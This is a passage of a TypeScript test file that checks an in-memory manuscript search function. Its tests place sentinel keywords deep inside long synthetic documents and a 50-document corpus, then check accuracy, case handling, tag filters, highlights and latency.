  const contrast100On0 = calculateContrastRatio(os100, os0);
  assert.ok(contrast100On0 >= 1.2, `Hairline border contrast (${contrast100On0}:1) must provide perceptible partition`);
});

// ---------------------------------------------------------------------------
// 4. DEEP MANUSCRIPT SEARCH (>5,000, >20,000, >50,000 CHARACTERS) TESTS
// ---------------------------------------------------------------------------

test('Adversarial Deep Manuscript Search: Keywords appearing at >5,000, >20,000, and >50,000 chars are located with 100% accuracy', () => {
  // Generate filler paragraphs of known length
  const fillerParagraph = 'The Daylight Computer DC1 LivePaper screen maintains high readability in direct ambient sunlight. Distraction-free writing fosters sustained creative cognition and flow.\n\n';
  const pLen = fillerParagraph.length; // ~165 chars

  // Construct manuscript with specific sentinels at precise depths
  let content = '';

  // 1. Fill up to >5,000 chars (32 paragraphs * 165 = ~5,280 chars)
  while (content.length < 5200) {
    content += fillerParagraph;
  }
  const offset5k = content.length;
  content += 'Deep section five thousand: the rare archipelago was sighted beyond the northern reef.\n\n';

  // 2. Fill up to >20,000 chars (~15,000 more chars)
  while (content.length < 20500) {
    content += fillerParagraph;
  }
  const offset20k = content.length;
  content += 'Deep section twenty thousand: traversing the labyrinthine corridors of the ancient library.\n\n';

  // 3. Fill up to >50,000 chars (~30,000 more chars)
  while (content.length < 51000) {
    content += fillerParagraph;
  }
  const offset50k = content.length;
  content += 'Deep section fifty thousand: discovering the supercalifragilistic manuscript hidden in the vault.\n\n';

  // 4. Fill beyond 60,000 chars
  while (content.length < 60000) {
    content += fillerParagraph;
  }
  const offset60k = content.length;
  content += 'Deep section sixty thousand: reaching the pinnacle zenithal observation platform at dusk.\n\n';

  // Postamble
  content += fillerParagraph.repeat(10);

  const totalChars = content.length;
  console.log(`\n--- Deep Manuscript Search Verification ---`);
  console.log(`Total manuscript length: ${totalChars} characters`);
  console.log(`Sentinel 1 ('archipelago') offset:           ${offset5k} chars (target > 5,000)`);
  console.log(`Sentinel 2 ('labyrinthine') offset:          ${offset20k} chars (target > 20,000)`);
  console.log(`Sentinel 3 ('supercalifragilistic') offset:  ${offset50k} chars (target > 50,000)`);
  console.log(`Sentinel 4 ('zenithal') offset:              ${offset60k} chars (target > 60,000)`);

  assert.ok(offset5k > 5000, `Sentinel 1 must be > 5,000 chars, got ${offset5k}`);
  assert.ok(offset20k > 20000, `Sentinel 2 must be > 20,000 chars, got ${offset20k}`);
  assert.ok(offset50k > 50000, `Sentinel 3 must be > 50,000 chars, got ${offset50k}`);
  assert.ok(offset60k > 60000, `Sentinel 4 must be > 60,000 chars, got ${offset60k}`);

  const testDoc: DocumentRecord = {
    id: 'doc-deep-manuscript',
    title: 'The Cartographer of Distant Horizons',
    content,
    created_at: 1000000,
    updated_at: 2000000,
    deleted_at: null,
    is_title_custom: true,
    format_version: 1,
    sync_status: 'synced',
  };

  const docs = [testDoc];
  const tagsMap = new Map<string, string[]>([['doc-deep-manuscript', ['novel/epic', 'cartography']]]);

  // Test Matrix for Deep Keywords
  const deepQueries = [
    // [Query, ExpectedKeyword, MinCharDepth]
    { query: 'archipelago', keyword: 'archipelago', minDepth: 5000 },
    { query: 'labyrinthine', keyword: 'labyrinthine', minDepth: 20000 },
    { query: 'supercalifragilistic', keyword: 'supercalifragilistic', minDepth: 50000 },
    { query: 'zenithal', keyword: 'zenithal', minDepth: 60000 },
    // Case Insensitivity at depths
    { query: 'ARCHIPELAGO', keyword: 'archipelago', minDepth: 5000 },
    { query: 'Labyrinthine', keyword: 'labyrinthine', minDepth: 20000 },
    { query: 'SUPERCALIFRAGILISTIC', keyword: 'supercalifragilistic', minDepth: 50000 },
    { query: 'ZENITHAL', keyword: 'zenithal', minDepth: 60000 },
    // Multi-term spanning multiple depths (>5k AND >50k)
    { query: 'archipelago supercalifragilistic', keyword: 'supercalifragilistic', minDepth: 50000 },
    { query: 'labyrinthine zenithal', keyword: 'zenithal', minDepth: 60000 },
    // Mixed tag filter + deep keyword
    { query: '#novel/epic supercalifragilistic', keyword: 'supercalifragilistic', minDepth: 50000 },
    { query: '#cartography labyrinthine', keyword: 'labyrinthine', minDepth: 20000 },
  ];

  let deepHitsCount = 0;

  for (const q of deepQueries) {
    const t0 = performance.now();
    const results = searchDocumentsInMemory(q.query, docs, tagsMap);
    const duration = performance.now() - t0;

    assert.strictEqual(
      results.length,
      1,
      `Query "${q.query}" must locate document with keyword at depth >${q.minDepth} chars`
    );
    assert.strictEqual(results[0].document.id, 'doc-deep-manuscript');
    assert.ok(
      results[0].score > 0,
      `Score must be positive for query "${q.query}"`
    );
    assert.ok(
      duration < 30.0,
      `Search query "${q.query}" on ${totalChars}-char manuscript must be <30ms, took ${duration.toFixed(3)}ms`
    );

    // Verify highlight snippet contains matched keyword
    const hasHighlight = results[0].matchHighlights.some(h =>
      h.toLowerCase().includes(q.keyword.toLowerCase())
    );
    assert.ok(
      hasHighlight,
      `Results for "${q.query}" must include highlight snippet for "${q.keyword}". Highlights: ${JSON.stringify(results[0].matchHighlights)}`
    );

    deepHitsCount++;
  }

  assert.strictEqual(
    deepHitsCount,
    deepQueries.length,
    `100% accuracy required: all ${deepQueries.length} deep queries must succeed`
  );
  console.log(`✔ All ${deepQueries.length} deep queries located with 100% accuracy and verified highlight snippets.`);
});

test('Adversarial Deep Manuscript Stress: Multi-document corpus with sentinels and <50ms latency', () => {
  const CORPUS_SIZE = 50;
  const PARAS_PER_DOC = 350; // ~55,000 chars per document
  const filler = 'Ambient sunlight reflects naturally from the transflective LivePaper surface. Zero blue light protects sleep and preserves circadian rhythm while authoring long-form manuscripts.\n\n';

  console.log(`\n--- Multi-Document Deep Corpus Benchmark (${CORPUS_SIZE} docs × ~55k chars = ~2.75M chars) ---`);

  const corpus: DocumentRecord[] = new Array(CORPUS_SIZE);
  const tagMap = new Map<string, string[]>();

  // Target document indices
  const targetDoc5k = 7;
  const targetDoc20k = 19;
  const targetDoc50k = 38;

  for (let d = 0; d < CORPUS_SIZE; d++) {
    const paragraphs: string[] = [];
    let currentLen = 0;

    for (let p = 0; p < PARAS_PER_DOC; p++) {
      let para = `[Doc ${d}, P${p}] ${filler}`;
      if (d === targetDoc5k && currentLen < 5500 && currentLen + para.length >= 5500) {
        para = `[Doc ${d}, P${p}] Deep observation at five thousand characters reveals obsidianmonolith in the clearing. ` + filler;
      }
      if (d === targetDoc20k && currentLen < 21000 && currentLen + para.length >= 21000) {
        para = `[Doc ${d}, P${p}] Deep observation at twenty thousand characters discovers crystallineastrolabe in the vault. ` + filler;
      }
      if (d === targetDoc50k && currentLen < 51000 && currentLen + para.length >= 51000) {
        para = `[Doc ${d}, P${p}] Deep observation at fifty thousand characters reveals phosphorchronometer atop the tower. ` + filler;
      }
      currentLen += para.length;
      paragraphs.push(para);
    }

    const docId = `deep-corpus-${d}`;
    corpus[d] = {
      id: docId,
      title: `Long Manuscript Volume ${d + 1}`,
      content: paragraphs.join(''),
      created_at: 1726876800000 + d * 10000,
      updated_at: 1726876800000 + d * 10000 + 5000,
      deleted_at: null,
      is_title_custom: true,
      format_version: 1,
      sync_status: 'synced',
    };
    tagMap.set(docId, [`archive/vol${d}`, 'corpus/longform']);
  }

  // Execute queries specifically targeting deep sentinels
  const testCases = [
    { query: 'obsidianmonolith', targetId: `deep-corpus-${targetDoc5k}`, desc: '>5k chars sentinel' },
    { query: 'crystallineastrolabe', targetId: `deep-corpus-${targetDoc20k}`, desc: '>20k chars sentinel' },
    { query: 'phosphorchronometer', targetId: `deep-corpus-${targetDoc50k}`, desc: '>50k chars sentinel' },
  ];

  for (const tc of testCases) {
    const t0 = performance.now();
    const hits = searchDocumentsInMemory(tc.query, corpus, tagMap);
    const duration = performance.now() - t0;

    console.log(`Corpus search for "${tc.query}" (${tc.desc}): ${duration.toFixed(2)}ms (hits: ${hits.length}, top: ${hits[0]?.document.id}, score: ${hits[0]?.score})`);
    assert.ok(hits.length >= 1, `Must return at least 1 hit for sentinel "${tc.query}"`);
    assert.strictEqual(hits[0].document.id, tc.targetId, `Top ranked hit must match target document ${tc.targetId}`);
    assert.ok(hits[0].score > 4000, `Top ranked hit must have exact match score > 4000 (got ${hits[0].score})`);
    assert.ok(
      duration < 50.0,
      `Corpus search latency (${duration.toFixed(2)}ms) must be strictly <50ms`
    );
  }
});
